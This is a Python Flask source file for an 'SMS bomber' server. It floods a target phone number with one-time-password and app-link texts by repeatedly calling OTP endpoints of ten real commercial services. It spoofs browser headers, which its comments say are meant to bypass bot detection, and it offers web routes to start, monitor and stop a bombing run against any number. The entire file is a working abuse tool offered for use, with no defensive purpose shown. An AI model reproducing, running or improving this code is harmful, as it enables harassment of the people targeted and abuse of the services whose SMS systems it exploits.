import os, time, requests, threading, random
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# Powerful headers to bypass basic bot detection
def get_headers():
    return {
        'User-Agent': random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36"
        ]),
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Referer': 'https://www.google.com/',
        'Origin': 'https://www.google.com'
    }

SMS_APIS = [
    {"url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={target}", "method": "GET"},
    {"url": "https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php?mobile={target}", "method": "GET"},
    {"url": "https://www.allensolly.com/capillarylogin/validateMobileOrEMail", "method": "POST", "data": {"mobileoremail": "{target}"}},
    {"url": "https://login.housing.com/api/v2/send-otp", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://porter.in/restservice/send_app_link_sms", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://api.nnnow.com/d/api/appDownloadLink", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://login.web.ajio.com/api/auth/signupSendOTP", "method": "POST", "data": {"mobileNumber": "{target}"}},
    {"url": "https://unacademy.com/api/v1/user/get_app_link/", "method": "POST", "data": {"phone": "{target}"}},
    {"url": "https://pharmeasy.in/api/auth/requestOTP", "method": "POST", "data": {"contactNumber": "{target}"}},
    {"url": "https://commonfront.paytm.com/v4/api/sendsms", "method": "POST", "data": {"phone": "{target}"}}
]

status_db = {"success": 0, "failed": 0, "running": False, "target": ""}

def bomb_worker(target, count, delay):
    global status_db
    status_db.update({"success": 0, "failed": 0, "running": True, "target": target})
    
    for i in range(count):
        if not status_db["running"]: break
        api = random.choice(SMS_APIS)
        try:
            url = api["url"].replace("{target}", target)
            if api["method"] == "GET":
                r = requests.get(url, headers=get_headers(), timeout=10)
            else:
                payload = {k: v.replace("{target}", target) for k, v in api["data"].items()}
                r = requests.post(url, data=payload, headers=get_headers(), timeout=10)
            
            if r.status_code < 400: status_db["success"] += 1
            else: status_db["failed"] += 1
        except: status_db["failed"] += 1
        time.sleep(delay)
    status_db["running"] = False

@app.route('/')
def home():
    return "<h1>TBOMB SERVER IS LIVE</h1><p>Use the web interface to start.</p>"

@app.route('/start')
def start():
    t, c = request.args.get('target'), int(request.args.get('count', 10))
    if t and not status_db["running"]:
        threading.Thread(target=bomb_worker, args=(t, c, 1.5)).start()
    return jsonify(status_db)

@app.route('/status')
def status(): return jsonify(status_db)

@app.route('/stop')
def stop():
    status_db["running"] = False
    return "stopped"

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
